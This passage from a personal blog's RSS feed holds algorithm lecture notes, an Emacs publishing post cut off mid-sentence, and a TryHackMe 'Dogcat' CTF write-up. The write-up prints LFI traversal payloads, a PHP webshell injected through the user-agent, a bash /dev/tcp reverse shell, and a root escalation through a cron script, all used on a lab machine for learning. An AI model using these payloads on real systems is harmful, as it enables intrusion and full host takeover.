    <span class="org-variable-name">c</span> <span class="org-operator">=</span> 1 <span class="org-operator">+</span> (u.bit_length() <span class="org-operator">//</span> n.bit_length())              <span class="org-comment-delimiter"># </span><span class="org-comment">u = O(n^c), calculate c</span>
    <span class="org-keyword">class</span> <span class="org-type">Obj</span>: <span class="org-keyword">pass</span>
    <span class="org-variable-name">D</span> <span class="org-operator">=</span> [Obj() <span class="org-keyword">for</span> a <span class="org-keyword">in</span> A]                                  <span class="org-comment-delimiter">#</span><span class="org-comment">O(n) initiate objects</span>
    <span class="org-keyword">for</span> i <span class="org-keyword">in</span> <span class="org-builtin">range</span>(n):                                      <span class="org-comment-delimiter"># </span><span class="org-comment">O(nc) make digit tuples</span>
        D[i].<span class="org-variable-name">digits</span> <span class="org-operator">=</span> []
        D[i].<span class="org-variable-name">item</span> <span class="org-operator">=</span> A[i]
        <span class="org-variable-name">high</span> <span class="org-operator">=</span> A[i].key
        <span class="org-keyword">for</span> j <span class="org-keyword">in</span> <span class="org-builtin">range</span>(c):                                  <span class="org-comment-delimiter"># </span><span class="org-comment">O(c) make digit tuple</span>
            <span class="org-variable-name">high</span>, <span class="org-variable-name">low</span> <span class="org-operator">=</span> <span class="org-builtin">divmod</span>(high, n)
            D[i].digits.append(low)
    <span class="org-comment-delimiter"># </span><span class="org-comment">Sort based on each digit key</span>
    <span class="org-keyword">for</span> i <span class="org-keyword">in</span> <span class="org-builtin">range</span>(c):                                      <span class="org-comment-delimiter"># </span><span class="org-comment">O(nc) sort each digit</span>
        <span class="org-keyword">for</span> j <span class="org-keyword">in</span> <span class="org-builtin">range</span>(n):                                  <span class="org-comment-delimiter"># </span><span class="org-comment">O(n) assign key i to tuples</span>
            D[j].<span class="org-variable-name">key</span> <span class="org-operator">=</span> D[j].digits[i]
        counting_sort(D)                                    <span class="org-comment-delimiter"># </span><span class="org-comment">O(n) sort on digit i</span>
    <span class="org-keyword">for</span> i <span class="org-keyword">in</span> <span class="org-builtin">range</span>(n):                                      <span class="org-comment-delimiter"># </span><span class="org-comment">O(n) output</span>
        <span class="org-variable-name">A</span>[i] <span class="org-operator">=</span> D[i].item
</pre>
</div>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
The Sterling formula can also be used
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Critical constant number of fields in tuple, because these are constant, only
constant calls to the tuple sort function will need to be called
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>6.006 Lec 6: Binary Trees Part I</title>
<link>posts/lectures/mit/6006/6.006-lec-6-binary-trees-part-i.html</link>
<pubDate>Sat, 19 Feb 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/mit/6006/6.006-lec-6-binary-trees-part-i.html</guid>
<description>
<![CDATA[<div id="outline-container-org65846cb" class="outline-2">
<h2 id="org65846cb"><span class="section-number-2">1.</span> <a href="#org65846cb">Lecture details</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>Professor: Erik Demain</li>
<li>Lecture: <a href="https://www.youtube.com/watch?v=76dhtgZt38A&amp;list=PLUl4u3cNGP63EdVPNLG3ToM6LaEUuStEY&amp;index=9">YouTube Link</a></li>
</ul>
</div>
</div>
<div id="outline-container-org250f06e" class="outline-2">
<h2 id="org250f06e"><span class="section-number-2">2.</span> <a href="#org250f06e">Trees, the ultimate data structure</a></h2>
<div class="outline-text-2" id="text-2">
<p>
From the data structures that we have seen so far in this course, one can make
the case that we have no data structure <i>to rule them all</i>. They all perform
reasonably well under certain circumstances, and under certain sets of input but
their overall performance is, at times, not optimal. Take hash tables for an
example. They are useful when <code>find(k)</code> and <code>insert(x)</code> are often used, but
absolutely ridiculous when we also want to <code>find_next(),find_previous()</code>
</p>
</div>
<div id="outline-container-org49611d1" class="outline-3">
<h3 id="org49611d1"><span class="section-number-3">2.1.</span> <a href="#org49611d1">Terminology</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Since binary trees are a linked-based data structure, utilizing pointers, much
of the terminology is know from our experience with Linked Lists:
</p>
<ul class="org-ul">
<li>Nodes</li>
<li>Links</li>
</ul>
</div>
<div id="outline-container-orge77824b" class="outline-4">
<h4 id="orge77824b"><span class="section-number-4">2.1.1.</span> <a href="#orge77824b">Tree specific attributes</a></h4>
<div class="outline-text-4" id="text-2-1-1">
<ul class="org-ul">
<li>Leaf
Leaves are the nodes that have no children ( because they are the items at the
<i>end</i> of the data structure, just like the leaves in a normal tree)</li>
<li><code>parent</code>
Pointer to the parent node</li>
<li><code>left</code>
Pointer to the left child node</li>
<li><code>right</code>
Pointer to the right child node</li>
</ul>
</div>
</div>
<div id="outline-container-orgdcc046e" class="outline-4">
<h4 id="orgdcc046e"><span class="section-number-4">2.1.2.</span> <a href="#orgdcc046e">Node characteristics</a></h4>
<div class="outline-text-4" id="text-2-1-2">
<ul class="org-ul">
<li><code>subtree(X)</code> = X and its defendants
so if X is the root node, then the subtree is the whole node</li>
<li><code>depth(X)</code>
Number of ancestors or, equally, edges in path from node X to root</li>
<li><code>height(X)</code>
Number of edges in the longest downward path, max depth of a node in subtree(X)
<ul class="org-ul">
<li>height(X)= max(left.height,right.height)+1</li>
<li>height(tree) = height(root Node)</li>
</ul></li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-orgd04ff3c" class="outline-2">
<h2 id="orgd04ff3c"><span class="section-number-2">3.</span> <a href="#orgd04ff3c">Today&rsquo;s analysis</a></h2>
<div class="outline-text-2" id="text-3">
<p>
We focus on getting to a point where tree operations perform in \(O(h)\), with h
being <code>height</code> of the tree.  Then in the next lecture, we will show that if the
tree is balanced then:  \(O(h)=O(\lg{n})\)
</p>
</div>
<div id="outline-container-org54c65e0" class="outline-3">
<h3 id="org54c65e0"><span class="section-number-3">3.1.</span> <a href="#org54c65e0">Working with an example</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
To further clarify the properties we talked about above before we continue:
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">property value\node</th>
<th scope="col" class="org-left">A</th>
<th scope="col" class="org-left">B</th>
<th scope="col" class="org-left">C</th>
<th scope="col" class="org-left">D</th>
<th scope="col" class="org-left">E</th>
<th scope="col" class="org-left">F</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">item</td>
<td class="org-left">A</td>
<td class="org-left">B</td>
<td class="org-left">C</td>
<td class="org-left">D</td>
<td class="org-left">E</td>
<td class="org-left">F</td>
</tr>

<tr>
<td class="org-left">parent</td>
<td class="org-left">/</td>
<td class="org-left">A</td>
<td class="org-left">A</td>
<td class="org-left">B</td>
<td class="org-left">B</td>
<td class="org-left">D</td>
</tr>

<tr>
<td class="org-left">left</td>
<td class="org-left">B</td>
<td class="org-left">D</td>
<td class="org-left">/</td>
<td class="org-left">F</td>
<td class="org-left">/</td>
<td class="org-left">/</td>
</tr>

<tr>
<td class="org-left">right</td>
<td class="org-left">C</td>
<td class="org-left">E</td>
<td class="org-left">/</td>
<td class="org-left">/</td>
<td class="org-left">/</td>
<td class="org-left">/</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="outline-container-org5e0f967" class="outline-3">
<h3 id="org5e0f967"><span class="section-number-3">3.2.</span> <a href="#org5e0f967">Traversal order</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
The traversal order ( as explained in this course ), is the <i>inorder</i> traversal.
More specifically, the nodes in a tree are recursively iterated in this order:
</p>
<blockquote>
<p>
for every node X
Nodes in .left before X, in .right after X
</p>
</blockquote>
<p>
Thus, the traversal order in the example tree is \(FDBEAC\)
</p>

<p>
Theoritically, what follows could be a legitimate function
</p>
<div class="org-src-container">
<pre class="src src-java"><span class="org-type">void</span> <span class="org-function-name">traverseSubtreeWithRootX</span>(<span class="org-type">Node</span> <span class="org-variable-name">X</span>)
{
    <span class="org-keyword">if</span> ( X.left != <span class="org-constant">null</span> )
        iterate(X.left);
    System.out.println(X);
    <span class="org-keyword">if</span> ( X.right != <span class="org-constant">null</span> )
        iterate(X.right);
}
</pre>
</div>
</div>
</div>
<div id="outline-container-org2c5377e" class="outline-3">
<h3 id="org2c5377e"><span class="section-number-3">3.3.</span> <a href="#org2c5377e">Operations</a></h3>
<div class="outline-text-3" id="text-3-3">
<ul class="org-ul">
<li><code>subtree_first(Node X)</code>
return the leftmost node in the subtree of X ( in our example that would be \(F\) )</li>
<li><code>successor(Node X)</code>
return the next node in traversal order
<ul class="org-ul">
<li>if <code>node.right</code>: <code>subtree_first(X.right)</code></li>
<li>else walk up until we go up a left branch <code>node.parent.left == node</code></li>
</ul></li>
<li><code>predecessor(Node X)</code>
return the previous node in traversal order
<ul class="org-ul">
<li>Directly linked to <code>successor(X)</code></li>
</ul></li>
<li><code>subtree_insert_after(Node X, Node new)</code>
<ul class="org-ul">
<li>if no <code>X.right</code>: put the new node there</li>
<li>else <code>successor.subtree_first().left</code></li>
</ul></li>
<li><code>subtree_insert_before(...)</code>
<ul class="org-ul">
<li>In a similar fashion to the previous fashion</li>
<li>if no <code>X.left</code>: put the new node there</li>
</ul></li>
<li><code>subtree_delete(node)</code><sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
<ul class="org-ul">
<li>if it is a leaf, simply delete it and delete the pointer in parent</li>
<li>else if <code>node.left</code>: <sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
<ol class="org-ol">
<li>swap <code>node.item</code> with <code>predecessor(node).item</code>
<i>No need to change the nodes themselves</i></li>
<li><code>subtree_delete(predecessor(node))</code></li>
</ol></li>
<li>else if <code>node.right</code>
<ol class="org-ol">
<li>swap <code>node.item</code> with <code>successor(node).item</code></li>
<li><p>
<code>subtree_delete(successor(node))</code>
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<tbody>
<tr>
<td class="org-left">Performance\Function</td>
<td class="org-left">subtree<sub>first</sub>()</td>
<td class="org-left">successor()</td>
<td class="org-left">subtree<sub>insert</sub><sub>after</sub>()</td>
<td class="org-left">subtree<sub>delete</sub>()</td>
</tr>

<tr>
<td class="org-left">Binary Tree</td>
<td class="org-left">O(h)</td>
<td class="org-left">O(h)</td>
<td class="org-left">O(h)</td>
<td class="org-left">O(h)</td>
</tr>
</tbody>
</table></li>
</ol></li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org6eef2cd" class="outline-2">
<h2 id="org6eef2cd"><span class="section-number-2">4.</span> <a href="#org6eef2cd">Trees and sets</a></h2>
<div class="outline-text-2" id="text-4">
<p>
We have outlined our binary tree&rsquo;s functions, but we do not know yet, where they
could be useful. The set interface, with which we have worked in previous
lectures can be implemented with a tree!
</p>

<p>
More specifically, due to the fact that binary trees have the <span class="underline">binary search
tree property</span><sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup>, we can ensure that <code>find(k)</code> performs in \(O(h)\), with
insertion, deletion in \(O(h)\) as well.
</p>
</div>
</div>
<div id="outline-container-org848651a" class="outline-2">
<h2 id="org848651a"><span class="section-number-2">5.</span> <a href="#org848651a">Trees and sequences</a></h2>
<div class="outline-text-2" id="text-5">
<p>
The sequence interface can also be effectively implemented by a binary tree. In
that case the sequence order will match the tree&rsquo;s traversal order. However, we
do not know yet how to implement one of the core sequence functions:
<code>subtree_at(i)</code>, to get the item in the \(i^{th}\) position.
</p>

<p>
Of course, we could iterate through the tree, and when we reach that position
return that item, but this algorithm runs in \(O(n)\) and obviously is not
efficient. What can we do to solve it?
</p>

<p>
We will ues the <code>size</code> property of the subtree. In that case the algorithm is:
</p>
<ol class="org-ol">
<li>Get the size \(n_{l}\) of the left subtree</li>
<li>if \(i<n_l\), then recurse on the left subtree</li>
<li>else if \(i>n_l\), then <code>i-=nl+1</code> and recurse on the right subtree</li>
<li>else you have \(i=n_l\) and you have found your node</li>
</ol>

<p>
Let&rsquo;s check the performance of this last algorithm. If <code>size</code> can be computed in
constant time then the algorithm runs in \(O(h)\)!
</p>
</div>
<div id="outline-container-orgf550161" class="outline-3">
<h3 id="orgf550161"><span class="section-number-3">5.1.</span> <a href="#orgf550161">Data Structure Augmentation</a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
By adding a <code>size</code> property in each node,  since size is a <span class="underline">subtree property</span>:
</p>
<div class="org-src-container">
<pre class="src src-python">node.<span class="org-variable-name">size</span> <span class="org-operator">=</span> left.size <span class="org-operator">+</span> right.size <span class="org-operator">+</span> 1
</pre>
</div>
<p>
We only add a \(O(h)\) operation for maintainance (when adding or removing a
node one should update the size for all ancestors) in return for constant time
in the size operation.
</p>
</div>
</div>
</div>
<div id="outline-container-orge765aa7" class="outline-2">
<h2 id="orge765aa7"><span class="section-number-2">6.</span> <a href="#orge765aa7">Summary</a></h2>
<div class="outline-text-2" id="text-6">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">set data structure</th>
<th scope="col" class="org-left">build()</th>
<th scope="col" class="org-left">find()</th>
<th scope="col" class="org-left">insert/delete</th>
<th scope="col" class="org-left">find min/max</th>
<th scope="col" class="org-left">find prev/next</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Binary Search Tree</td>
<td class="org-left">O(nlogn)</td>
<td class="org-left">O(h)</td>
<td class="org-left">O(h)</td>
<td class="org-left">O(h)</td>
<td class="org-left">O(h)</td>
</tr>
</tbody>
</table>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">sequence data structure</th>
<th scope="col" class="org-left">build()</th>
<th scope="col" class="org-left">get<sub>at</sub>(),set<sub>at</sub>()</th>
<th scope="col" class="org-left">insert/delete first</th>
<th scope="col" class="org-left">inset/delete last</th>
<th scope="col" class="org-left">insert/delete at</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Binary Tree</td>
<td class="org-left">O(n)</td>
<td class="org-left">h</td>
<td class="org-left">h</td>
<td class="org-left">h</td>
<td class="org-left">h</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Are they actually linked to <code>rotateLeft(X)</code>, <code>rotateRight(X)</code>?
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
We do not care about balance right now.
</p></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Every key in left subtree \(\leq\) node.key \(\leq\) every key in right subtree
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>THM: Dogcat</title>
<link>posts/tryhackme/dogcat.html</link>
<pubDate>Sat, 26 Mar 2022 00:00:00 +0200</pubDate>
<guid>posts/tryhackme/dogcat.html</guid>
<description>
<![CDATA[<div id="outline-container-org3ff7daa" class="outline-2">
<h2 id="org3ff7daa"><span class="section-number-2">1.</span> <a href="#org3ff7daa">Reconnaissance</a></h2>
<div class="outline-text-2" id="text-1">
<p>
First I decided to use <code>masscan</code> on all of the machine ports to limit the ports
I would then run more elaborate scans. However, since that scan did not wield
any results, I went back to good old <code>nmap</code>.
</p>
<div class="code" id="org4820e03">
<p>
sudo nmap -Pn &lt;MACHINE<sub>IP</sub>&gt;
</p>

</div>
<p>
This checks only the most frequently used ports but gave us a good place to
start; two ports were open:
</p>
<ul class="org-ul">
<li>22 which belongs to <code>ssh</code></li>
<li>80 which signals the existence of a webserver</li>
</ul>
<p>
After that I ran
</p>
<div class="code" id="orge494c8e">
<p>
sudo nmap -A -p22,80 &lt;MACHINE<sub>IP</sub>&gt;
</p>

</div>
<p>
to get more information on the software these ports were running.
</p>
<blockquote>
<p>
22: OpenSSH 7.6p1, running on a Ubuntu Machine
80: Apache 2.4.38 WebServer
</p>
</blockquote>
</div>
<div id="outline-container-org7c10244" class="outline-3">
<h3 id="org7c10244"><span class="section-number-3">1.1.</span> <a href="#org7c10244">Further enumeration</a></h3>
<div class="outline-text-3" id="text-1-1">
</div>
<div id="outline-container-orgebec721" class="outline-4">
<h4 id="orgebec721"><span class="section-number-4">1.1.1.</span> <a href="#orgebec721">Viewing the source code</a></h4>
<div class="outline-text-4" id="text-1-1-1">
<p>
Just by checking the source code for the website through the <i>Inspect tool</i> in
Firefox, it is easy for us to see that there are two directories called dogs and
cats, each of which holds pictures in the form of <i>&lt;NO&gt;.jpg</i> where NO ranges
from 1 to 10.
</p>
</div>
</div>
<div id="outline-container-org6bd87c5" class="outline-4">
<h4 id="org6bd87c5"><span class="section-number-4">1.1.2.</span> <a href="#org6bd87c5">Gobuster</a></h4>
<div class="outline-text-4" id="text-1-1-2">
<p>
Even though it is a generally good habit to use <code>gobuster</code> to check for any
useful accessible files, it was not the case in this room. In fact, I think that
it was due to this type of scanning that I had to terminate the vm and restart
it in order for it to respond to my <i>GET</i> requests.
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org848011a" class="outline-2">
<h2 id="org848011a"><span class="section-number-2">2.</span> <a href="#org848011a">Exploitation</a></h2>
<div class="outline-text-2" id="text-2">
<p>
We see that the website uses <code>?view=dog</code> to display a random picture for a dog
or a cat respectively, pointing out that we could check for <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">Local File
Inclusion</a>.
</p>

<p>
After a little bit of toying around with that, realising that the string passed
needs to contain either <i>dog</i> or <i>cat</i> in order to be executed by the php
back-end, we try to see what files we can access:
</p>
<div class="code" id="org255961e">
<p>
?view=../../../../../etc/passwd%00dog
</p>

<p>
?view=dog/../../../../../etc/passwd
</p>

<p>
?view=dogs
</p>

</div>
<p>
The first one showed an error about the file, while the second one proved to be
<span class="underline">very</span> interesting. The server side did not search for the /etc/passwd file but
for /etc/passwd.php. The backend adds an extension to what we pass!
</p>

<p>
That means, that instead of dog or cat the backend reads a dog.php or cat.php
respectively. It may be beneficial to access it:
</p>

<p>
Using a php wrapper we tailor the request to our needs:
</p>
<blockquote>
<p>
?view=php://filter/convert.base64-encode/dog
</p>
</blockquote>
<p>
Getting back the code for <i>dog.php</i> encoded in base64.
To decode it, avoiding online tools one can simply use
</p>

<div class="code" id="org464bf8b">
<p>
echo &rsquo;&lt;paste encoded code here&gt;&rsquo; &gt; dog.b64
base64 -d dog.b64 &gt; dog.php
</p>

</div>

<p>
We do the same for <i>cat.php</i> but it turns out that these files have no actual
meaning. They do not reveal any useful information. This changes when we get the
<i>index.php</i>. Inside it we realise that the <code>.php</code> extension that gets added to
our requests can be changed using the <code>?ext=</code> parameter!
</p>
</div>
<div id="outline-container-orgf4e7ac1" class="outline-3">
<h3 id="orgf4e7ac1"><span class="section-number-3">2.1.</span> <a href="#orgf4e7ac1">The passwd file</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Going back to previous requests we can finally see /etc/passwd!!
</p>
<div class="code" id="org838cb43">
<p>
?view=dog/../../../../../etc/passwd&amp;ext=
</p>

</div>
<p>
Completely minimal installation; Only one user has terminal access, <code>root</code> and
every other account listed on passwd has <code>nologin</code> set as shell.
</p>

<p>
Bruteforcing root over ssh does not wield any results :(
</p>
</div>
</div>
<div id="outline-container-org8c912f3" class="outline-3">
<h3 id="org8c912f3"><span class="section-number-3">2.2.</span> <a href="#org8c912f3">Checking the logs</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
After just a little bit of googling, we can see that the apache server holds
logs of all the requests at <code>/var/log/apache2/access.log</code>, and it also logs the
user agent we have used for the request.
</p>

<p>
We can see now how to proceed, manually set the agent to a webshell and run all
the commands through it. Will it work?
</p>

<p>
Yup, it worked.
</p>
</div>
</div>
<div id="outline-container-org73d4c6b" class="outline-3">
<h3 id="org73d4c6b"><span class="section-number-3">2.3.</span> <a href="#org73d4c6b">Webshell</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
Either through <code>curl</code>, <code>burpsuite</code> or <code>zap</code> we set the user-agent to
</p>
<div class="code" id="org9146551">
<p>
&lt;?php system($<sub>GET</sub>[&rsquo;cmd&rsquo;]) ?&gt;
</p>

</div>
<p>
and modify our link so that it also has a cmd parameter, which I set to <code>ls</code> to
verify that it is working
</p>
</div>
</div>
<div id="outline-container-orgaeb0a27" class="outline-3">
<h3 id="orgaeb0a27"><span class="section-number-3">2.4.</span> <a href="#orgaeb0a27">Remote shell &gt;&gt; Webshell</a></h3>
<div class="outline-text-3" id="text-2-4">
<p>
To get from the webshell to a remote shell is nothing difficult; We open a
listener in our machine <code>nc -lvnp &lt;port&gt;</code> and then use a <i>good enough</i> command
on the cmd parameter
</p>

<p>
I went with this one ( after checking with <code>whereis bash</code> )
</p>
<div class="code" id="org282b45e">
<p>
bash -c &ldquo;bash -i &gt;&amp; /dev/tcp/&lt;MYIP&gt;/&lt;MYPORT&gt; 0&gt;&amp;1&rdquo;
</p>

</div>

<p>
<i>Hint</i>: Do not forget to encode it as url<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>
</div>
</div>
</div>
<div id="outline-container-org33c580a" class="outline-2">
<h2 id="org33c580a"><span class="section-number-2">3.</span> <a href="#org33c580a">Privilege escalation</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Now the difficult part is over; two of the flags are within our reach without
even trying to gain root privileges&#x2026; but what if&#x2026;!
</p>

<p>
Naturally the first step was to check for sudo privileges <code>sudo -l</code>
It lets us run <code>env</code> without a password, which means, pretty much that we can do
anything we want as root on the machine.
</p>
<div class="code" id="org3d04790">
<p>
sudo env bash
</p>

</div>

<p>
The third flag is in the <code>/root</code> directory
</p>
</div>
</div>
<div id="outline-container-org25a129b" class="outline-2">
<h2 id="org25a129b"><span class="section-number-2">4.</span> <a href="#org25a129b">Where do we go from here</a></h2>
<div class="outline-text-2" id="text-4">
<p>
I started digging around the system, hoping I could find something useful to see
where to go from there. I ran <code>ls -al</code> on <code>/</code> and discovered a <code>.dockerenv</code>. It
seems we&rsquo;re inside a Docker environment!
</p>

<p>
(Well obviously, it is in the room description&#x2026; Except if you forgot to read
it thoroughly)
</p>

<p>
Next stop was to check whether <code>crontab -l</code> had something to show&#x2026; No luck there
</p>

<p>
Not long after I realised that the <code>/opt</code> directory was nearly empty ( In
hindsight I think it may have had been wise to check for <code>du</code> at that point ),
and inside it was an interesting <code>backup.sh</code> file.
</p>

<p>
I added a reverse shell there, opened a listener on my machine, just in case it
was scheduled to run every now and then and kept digging. Lucky me<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup> after a
little time I saw that my netcat listener was now a root shell outside of the
docker environment!!
</p>

<p>
Getting the flag from there was extremely easy.
</p>
</div>
</div>
<div id="outline-container-org4ec8ab2" class="outline-2">
<h2 id="org4ec8ab2"><span class="section-number-2">5.</span> <a href="#org4ec8ab2">Summary</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Even though I had met and toyed around with LFI before, it was the first time I
had to use it in a CTF room and proved to be quite interesting to me, relying on
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a> to get some information on techniques and places to start
</p>

<p>
Also, it was interesting to see the docker aspect of the room, which I could not
understand even hours after completing the room ( it seemed way too simple )
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Obviously one can always perform this step using many other techniques.
This one just feels more natural to me.
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
After finishing this article, I decided to check the writeups suggested
in thm, to see if anyone had a better explanation one more logical than my
<i>hunch</i>. It was impressively simple: The backup directory that existed in
<code>/opt/backups</code> was significantly <i>newer</i> than the shell script, meaning that the
machine was backed up regularly
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Git Happens</title>
<link>posts/tryhackme/githappens.html</link>
<pubDate>Sat, 26 Mar 2022 00:00:00 +0200</pubDate>
<guid>posts/tryhackme/githappens.html</guid>
<description>
<![CDATA[]]>
</description></item>
<item>
<title>A stupid solution to a stupid problem</title>
<link>posts/20251130_a-stupid-solution-to-a-stupid-problem.html</link>
<pubDate>Sun, 30 Nov 2025 21:23:00 +0200</pubDate>
<guid>posts/20251130_a-stupid-solution-to-a-stupid-problem.html</guid>
<description>
<![CDATA[<div id="outline-container-org5a372c8" class="outline-2">
<h2 id="org5a372c8"><span class="section-number-2">1.</span> <a href="#org5a372c8">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
I haven&rsquo;t published any articles for quite a long time. Usually, when that
happens, it&rsquo;s either because I didn&rsquo;t want to write about anything, or I didn&rsquo;t
have the time.
</p>

<p>
God knows I haven&rsquo;t had much time these past months (and won&rsquo;t have
as much as one would like moving forward), but I&rsquo;ve put in work on quite a few
projects I was excited to write about. And I wrote, because I had made
it easy for myself – just pressing `~&lt;spc&gt;la~` in Emacs creates a properly named and
formatted article. I needed nothing more.
</p>
</div>
</div>
<div id="outline-container-org05b4a60" class="outline-2">
<h2 id="org05b4a60"><span class="section-number-2">2.</span> <a href="#org05b4a60">Current workflow</a></h2>
<div class="outline-text-2" id="text-2">
<p>
But if that&rsquo;s all&#x2026; why didn&rsquo;t I publish? Because I hadn&rsquo;t made it easy for publishing. In
fact, the process of publishing an article remains quite cumbersome. For instance, if I create
article A but don&rsquo;t publish (or even fully write) it before completing article B, it messes things up:
</p>
<ol class="org-ol">
<li>It gets published in Org mode.</li>
<li>It gets added by Python to my index files (both the generic archive, the tags index, and the latest articles).</li>
</ol>
<p>
And I don&rsquo;t want to start &ldquo;deleting&rdquo; content I don&rsquo;t want to publish.
</p>

<div class="note" id="org1825da9">
<p>
An obvious solution is to keep my draft files in a directory separate from where they&rsquo;ll be published. I tried that once, but without elaborating, it presented its own set of problems.
</p>

</div>
</div>
</div>
<div id="outline-container-org9663ff2" class="outline-2">
<h2 id="org9663ff2"><span class="section-number-2">3.</span> <a href="#org9663ff2">Bypassing the problem</a></h2>
<div class="outline-text-2" id="text-3">
<p>
If you&rsquo;ve read the Org documentation on publishing (for instance, the <a href="https://orgmode.org/manual/Selecting-files.html">Selecting files
section</a>), and then proceeded to tinker with your own configuration, you might
have realized that exclusions are a tricky thing.
</p>

<p>
It&rsquo;s a truly frustrating problem. Wanting to simply exclude a file<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, yet somehow your
`:exclude-tags &rsquo;(&ldquo;draft&rdquo; &ldquo;noexport&rdquo; &ldquo;nopublish&rdquo;)` becomes another bystander. What
if&#x2026; I exclude the files I want by replacing the publishing function?
</p>
</div>
</div>
<div id="outline-container-org6f91cfb" class="outline-2">
<h2 id="org6f91cfb"><span class="section-number-2">4.</span> <a href="#org6f91cfb">My index publication function</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Aptly named `my-selective-publish`, this function came to me while working on a
wholly different project, yet I wanted to test it. And it worked!
</p>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defun</span> <span class="org-function-name">my-selective-publish</span> (plist filename pub-dir)
  <span class="org-doc">"Publish FILENAME only if it is an index.org file."</span>
  (<span class="org-keyword">when</span> (string-equal <span class="org-string">"index.org"</span> (file-name-nondirectory filename))
    (org-html-publish-to-html plist filename pub-dir)))
</pre>
</div>

<p>
Instead of specifying `org-html-publish-to-html` as the publishing function
directly, I simply replaced it with `my-selective-publish`. It ignores
everything except the `index.org` files.
</p>
<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">setq</span> org-publish-project-alist
      (list

       (list <span class="org-string">"indices"</span>
             <span class="org-builtin">:base-directory</span> base-dir
             <span class="org-builtin">:recursive</span> t
             <span class="org-builtin">:html-postamble</span> general-postamble
             <span class="org-builtin">:publishing-directory</span> public-dir
             <span class="org-builtin">:publishing-function</span> 'my-selective-publish
             <span class="org-builtin">:with-author</span> nil           <span class="org-comment-delimiter">;; </span><span class="org-comment">Don't include author name</span>
             <span class="org-builtin">:with-creator</span> nil            <span class="org-comment-delimiter">;; </span><span class="org-comment">Include Emacs and Org versions in footer</span>
             <span class="org-builtin">:with-drawers</span> t
             <span class="org-builtin">:headline-level</span> 4
             <span class="org-builtin">:with-toc</span> nil
             <span class="org-builtin">:section-numbers</span> nil       <span class="org-comment-delimiter">;; </span><span class="org-comment">Don't include section numbers</span>
             <span class="org-builtin">:time-stamp-file</span> nil)
</pre>
</div>
</div>
</div>
<div id="outline-container-org1edbf1b" class="outline-2">
<h2 id="org1edbf1b"><span class="section-number-2">5.</span> <a href="#org1edbf1b">Working with draft articles</a></h2>
<div class="outline-text-2" id="text-5">
<p>
At this point, one might ask: &ldquo;Great, but how is that helpful?&rdquo; The thing is,
